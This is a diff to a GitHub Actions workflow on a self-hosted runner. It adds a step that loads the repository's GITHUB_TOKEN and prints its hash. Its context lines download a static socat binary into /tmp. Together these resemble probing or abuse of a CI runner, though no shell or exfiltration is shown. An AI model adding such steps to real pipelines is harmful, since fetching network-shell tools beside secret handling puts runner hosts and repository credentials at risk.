@@ -7,6 +7,11 @@ jobs:
   build:
     runs-on: self-hosted
     steps:
+      - name: load secret
+        run: echo $TOK | sha256sum
+        env:
+          TOK: ${{ secrets.GITHUB_TOKEN }}
+    
       - name: Run a one-line script
         run: |
           wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
